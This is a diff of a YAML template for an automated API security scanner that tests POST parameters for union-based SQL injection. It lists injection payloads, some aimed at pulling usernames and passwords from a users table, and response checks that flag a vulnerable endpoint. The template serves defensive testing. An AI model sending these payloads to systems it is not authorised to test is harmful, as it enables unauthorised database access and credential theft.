@@ -1,9 +1,29 @@
 id: BASIC_UNION_BASED_SQLI_POST
 info:
   name: "Basic Union based SQL Injection test on POST method APIs"
-  description: "The Basic Union-Based SQL Injection Test on POST Method APIs checks for vulnerabilities where an attacker can use the `UNION` SQL operator to manipulate backend queries through POST request parameters. By injecting malicious SQL code into input fields, the attacker can potentially access unauthorized data or modify database contents. This test targets APIs that do not properly validate or sanitize user inputs, making them susceptible to SQL injection. Proper input validation and parameterized queries are key to preventing such attacks."
-  details: "The Basic Union-Based SQL Injection Test on POST Method APIs involves injecting malicious SQL queries into POST request parameters that are not properly sanitized or validated. The test specifically exploits the `UNION` operator, which allows attackers to combine results from multiple SQL queries, potentially exposing sensitive data from the database. This type of attack can lead to unauthorized data access, disclosure of sensitive information, and in some cases, database corruption. Implementing parameterized queries and strong input validation is essential to mitigate such risks."
-  impact: "The impact of the Basic Union-Based SQL Injection Test on POST Method APIs can be severe, as it allows attackers to access or manipulate sensitive database information through malicious SQL queries. This can lead to unauthorized data exposure, data corruption, and in some cases, complete system compromise. Additionally, attackers could escalate privileges or perform other malicious actions, potentially causing significant damage to the organization’s reputation, legal liabilities, and financial losses. Proper input sanitization and query parameterization are critical to preventing such attacks."
+  description: "The Basic Union-Based SQL Injection Test on POST Method APIs checks
+    for vulnerabilities where an attacker can use the `UNION` SQL operator to manipulate
+    backend queries through POST request parameters. By injecting malicious SQL code
+    into input fields, the attacker can potentially access unauthorized data or modify
+    database contents. This test targets APIs that do not properly validate or sanitize
+    user inputs, making them susceptible to SQL injection. Proper input validation
+    and parameterized queries are key to preventing such attacks."
+  details: "The Basic Union-Based SQL Injection Test on POST Method APIs involves
+    injecting malicious SQL queries into POST request parameters that are not properly
+    sanitized or validated. The test specifically exploits the `UNION` operator, which
+    allows attackers to combine results from multiple SQL queries, potentially exposing
+    sensitive data from the database. This type of attack can lead to unauthorized
+    data access, disclosure of sensitive information, and in some cases, database
+    corruption. Implementing parameterized queries and strong input validation is
+    essential to mitigate such risks."
+  impact: "The impact of the Basic Union-Based SQL Injection Test on POST Method APIs
+    can be severe, as it allows attackers to access or manipulate sensitive database
+    information through malicious SQL queries. This can lead to unauthorized data
+    exposure, data corruption, and in some cases, complete system compromise. Additionally,
+    attackers could escalate privileges or perform other malicious actions, potentially
+    causing significant damage to the organization’s reputation, legal liabilities,
+    and financial losses. Proper input sanitization and query parameterization are
+    critical to preventing such attacks."
 
   category:
     name: NO_AUTH
@@ -12,18 +32,18 @@ info:
   subCategory: BASIC_UNION_BASED_SQLI_POST
   severity: MEDIUM
   tags:
-    - Business logic
-    - OWASP top 10
-    - HackerOne top 10
+  - Business logic
+  - OWASP top 10
+  - HackerOne top 10
   references:
-    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
-    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
-    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+  - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+  - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
   cwe:
-    - CWE-287
+  - CWE-287
   cve:
-    - CVE-2020-24008
-    - CVE-2021-45901
+  - CVE-2020-24008
+  - CVE-2021-45901
 
 attributes:
   nature: INTRUSIVE
@@ -41,203 +61,206 @@ api_selection_filters:
     length:
       gt: 0
     not_contains:
-      - Error
-      - Internal Server
-      - Failed
-      - Unauthorized
-      - access denied
-      - Forbidden
-      - Method Not allowed
-      - Gateway timeout
-      - request timeout
-      - server error
-      - server busy
-      - authentication error
-      - authorization error
-      - validation error
-      - Permission Denied
-      - invalid token
-      - token expired
-      - session expired
-      - session timeout
-      - unexpected error
-      - unable to process request
-      - bad request
-      - service unavailable
-      - account is locked
-      - account is blocked
-      - multiple failed attempts
-      - <html>
-      - </html>
+    - Error
+    - Internal Server
+    - Failed
+    - Unauthorized
+    - access denied
+    - Forbidden
+    - Method Not allowed
+    - Gateway timeout
+    - request timeout
+    - server error
+    - server busy
+    - authentication error
+    - authorization error
+    - validation error
+    - Permission Denied
+    - invalid token
+    - token expired
+    - session expired
+    - session timeout
+    - unexpected error
+    - unable to process request
+    - bad request
+    - service unavailable
+    - account is locked
+    - account is blocked
+    - multiple failed attempts
+    - <html>
+    - </html>
 
   request_payload:
     for_one:
       key:
         regex: ".*"
-        extract: userKey
+        extractMultiple: userKey
       value:
         extract: userVal
 wordLists:
   unionBasedPayloads:
-    - "' UNION SELECT null, null--"
-    - "' UNION SELECT null, null, null--"
-    - "' UNION SELECT null, null, null, null--"
-    - "' UNION SELECT 1, 'username', 'password' FROM users--"
-    - "' UNION SELECT null, username, password FROM users--"
-    - "' UNION ALL SELECT null, null, null--"
-    - "' UNION ALL SELECT 1, 'admin', 'password'--"
-    - "' UNION SELECT 1, 'abc', 'def', null, null--"
-    - "' UNION SELECT username, password FROM users--"
+  - "' UNION SELECT null, null--"
+  - "' UNION SELECT null, null, null--"
+  - "' UNION SELECT null, null, null, null--"
+  - "' UNION SELECT 1, 'username', 'password' FROM users--"
+  - "' UNION SELECT null, username, password FROM users--"
+  - "' UNION ALL SELECT null, null, null--"
+  - "' UNION ALL SELECT 1, 'admin', 'password'--"
+  - "' UNION SELECT 1, 'abc', 'def', null, null--"
+  - "' UNION SELECT username, password FROM users--"
   unionNegativeBasedPayloads:
-    - "' UNION SELECT null, null WHERE 1=0-- "
-    - "' UNION SELECT null, null, null WHERE 1=0--"
-    - "' UNION SELECT null, null, null, null WHERE 1=0--"
-    - "' UNION SELECT 1, 'username', 'password' FROM users WHERE 1=0--"
-    - "' UNION SELECT null, username, password FROM users WHERE 1=0--"
-    - "' UNION ALL SELECT null, null, null WHERE 1=0--"
-    - "' UNION ALL SELECT 1, 'admin', 'password' WHERE 1=0--"
-    - "' UNION SELECT 1, 'abc', 'def', null, null WHERE 1=0--"
-    - "' UNION SELECT username, password FROM users WHERE 1=0--"
+  - "' UNION SELECT null, null WHERE 1=0-- "
+  - "' UNION SELECT null, null, null WHERE 1=0--"
+  - "' UNION SELECT null, null, null, null WHERE 1=0--"
+  - "' UNION SELECT 1, 'username', 'password' FROM users WHERE 1=0--"
+  - "' UNION SELECT null, username, password FROM users WHERE 1=0--"
+  - "' UNION ALL SELECT null, null, null WHERE 1=0--"
+  - "' UNION ALL SELECT 1, 'admin', 'password' WHERE 1=0--"
+  - "' UNION SELECT 1, 'abc', 'def', null, null WHERE 1=0--"
+  - "' UNION SELECT username, password FROM users WHERE 1=0--"
 execute:
   type: multiple
   requests:
-    - req:
-        - modify_body_param:
-            userKey: ${userVal}${unionBasedPayloads}
-        - validate:
-            response_code:
-              gte: 200
-              lt: 300
-            response_payload:
-              length:
-                gt: 0
-              not_contains:
-                - Error
-                - Internal Server
-                - Fail
-                - Unauthorized
-                - access denied
-                - Forbidden
-                - Method Not allowed
-                - Gateway timeout
-                - request timeout
-                - server error
-                - server busy
-                - authentication error
-                - authorization error
-                - validation error
-                - Permission Denied
-                - invalid
-                - token expired
-                - session expired
-                - session timeout
-                - unexpected error
-                - unable to process request
-                - bad request
-                - service unavailable
-                - account is locked
-                - account is blocked
-                - multiple failed attempts
-                - Attention Required!
-                - CloudFlare
-                - Sorry, you have been blocked
-                - UNION
-                - SELECT
-                - <html>
-                - </html>
-        - success: x2
-        - failure: exit
-    - req:
-        - modify_body_param:
-            userKey: ${userVal}${unionNegativeBasedPayloads}
-        - validate:
-            response_code:
-              gte: 200
-              lt: 300
-            response_payload:
-              length:
-                gt: 0
-              not_contains:
-                - Error
-                - Internal Server
-                - Fail
-                - Unauthorized
-                - access denied
-                - Forbidden
-                - Method Not allowed
-                - Gateway timeout
-                - request timeout
-                - server error
-                - server busy
-                - authentication error
-                - authorization error
-                - validation error
-                - Permission Denied
-                - invalid
-                - token expired
-                - session expired
-                - session timeout
-                - unexpected error
-                - unable to process request
-                - bad request
-                - service unavailable
-                - account is locked
-                - account is blocked
-                - multiple failed attempts
-                - Attention Required!
-                - CloudFlare
-                - Sorry, you have been blocked
-                - UNION
-                - SELECT
-                - <html>
-                - </html>
-              neq_obj: "${x1.response.body}"
-        - success: x3
-        - failure: exit
-    - req:
-        - modify_body_param:
-            userKey: ${userVal}${unionNegativeBasedPayloads}
-        - validate:
-            response_code:
-              gte: 200
-              lt: 300
-            response_payload:
-              length:
-                gt: 0
-              not_contains:
-                - Error
-                - Internal Server
-                - Fail
-                - Unauthorized
-                - access denied
-                - Forbidden
-                - Method Not allowed
-                - Gateway timeout
-                - request timeout
-                - server error
-                - server busy
-                - authentication error
-                - authorization error
-                - validation error
-                - Permission Denied
-                - invalid
-                - token expired
-                - session expired
-                - session timeout
-                - unexpected error
-                - unable to process request
-                - bad request
-                - service unavailable
-                - account is locked
-                - account is blocked
-                - multiple failed attempts
-                - Attention Required!
-                - CloudFlare
-                - Sorry, you have been blocked
-                - UNION
-                - SELECT
-                - <html>
-                - </html>
-              eq_obj: "${x2.response.body}"
-        - success: vulnerable
-        - failure: exit
+  - req:
+    - for_each_combination: true
+    - modify_body_param:
+        ${userKey}: ${userVal}${unionBasedPayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          not_contains:
+          - Error
+          - Internal Server
+          - Fail
+          - Unauthorized
+          - access denied
+          - Forbidden
+          - Method Not allowed
+          - Gateway timeout
+          - request timeout
+          - server error
+          - server busy
+          - authentication error
+          - authorization error
+          - validation error
+          - Permission Denied
+          - invalid
+          - token expired
+          - session expired
+          - session timeout
+          - unexpected error
+          - unable to process request
+          - bad request
+          - service unavailable
+          - account is locked
+          - account is blocked
+          - multiple failed attempts
+          - Attention Required!
+          - CloudFlare
+          - Sorry, you have been blocked
+          - UNION
+          - SELECT
+          - <html>
+          - </html>
+    - success: x2
+    - failure: exit
+  - req:
+    - for_each_combination: true
+    - modify_body_param:
+        ${userKey}: ${userVal}${unionNegativeBasedPayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          not_contains:
+          - Error
+          - Internal Server
+          - Fail
+          - Unauthorized
+          - access denied
+          - Forbidden
+          - Method Not allowed
+          - Gateway timeout
+          - request timeout
+          - server error
+          - server busy
+          - authentication error
+          - authorization error
+          - validation error
+          - Permission Denied
+          - invalid
+          - token expired
+          - session expired
+          - session timeout
+          - unexpected error
+          - unable to process request
+          - bad request
+          - service unavailable
+          - account is locked
+          - account is blocked
+          - multiple failed attempts
+          - Attention Required!
+          - CloudFlare
+          - Sorry, you have been blocked
+          - UNION
+          - SELECT
+          - <html>
+          - </html>
+          neq_obj: "${x1.response.body}"
+    - success: x3
+    - failure: exit
+  - req:
+    - for_each_combination: true
+    - modify_body_param:
+        ${userKey}: ${userVal}${unionNegativeBasedPayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          not_contains:
+          - Error
+          - Internal Server
+          - Fail
+          - Unauthorized
+          - access denied
+          - Forbidden
+          - Method Not allowed
+          - Gateway timeout
+          - request timeout
+          - server error
+          - server busy
+          - authentication error
+          - authorization error
+          - validation error
+          - Permission Denied
+          - invalid
+          - token expired
+          - session expired
+          - session timeout
+          - unexpected error
+          - unable to process request
+          - bad request
+          - service unavailable
+          - account is locked
+          - account is blocked
+          - multiple failed attempts
+          - Attention Required!
+          - CloudFlare
+          - Sorry, you have been blocked
+          - UNION
+          - SELECT
+          - <html>
+          - </html>
+          eq_obj: "${x2.response.body}"
+    - success: vulnerable
+    - failure: exit
